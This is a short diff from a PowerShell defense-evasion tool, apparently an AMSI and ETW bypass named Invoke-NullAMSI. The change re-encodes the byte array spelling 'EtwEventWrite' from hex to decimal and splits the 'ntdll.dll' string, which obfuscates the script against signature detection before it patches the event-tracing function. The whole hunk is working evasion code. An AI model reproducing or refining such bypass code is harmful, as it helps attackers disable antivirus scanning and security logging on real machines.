@@ -212,7 +212,7 @@ function Invoke-NullAMSI {
     if ($etw) {
         # Same methodology as for the 4MSI bypass
         Write-host "[*] Patching ETW" -ForegroundColor Cyan
-        $etwFunc = [System.Text.Encoding]::ASCII.GetString([Byte[]](0x45, 0x74, 0x77, 0x45, 0x76, 0x65, 0x6E, 0x74, 0x57, 0x72, 0x69, 0x74, 0x65))
+        $etwFunc = [Text.Encoding]::ASCII.GetString([Byte[]](69, 116, 119, 69, 118, 101, 110, 116, 87, 114, 105, 116, 101))
 
         $etwAddr = Get-Function ("nt{0}.dll" -f "dll") $etwFunc
         Write-Verbose "[*] Handle of ${etwFunc}: $etwAddr"
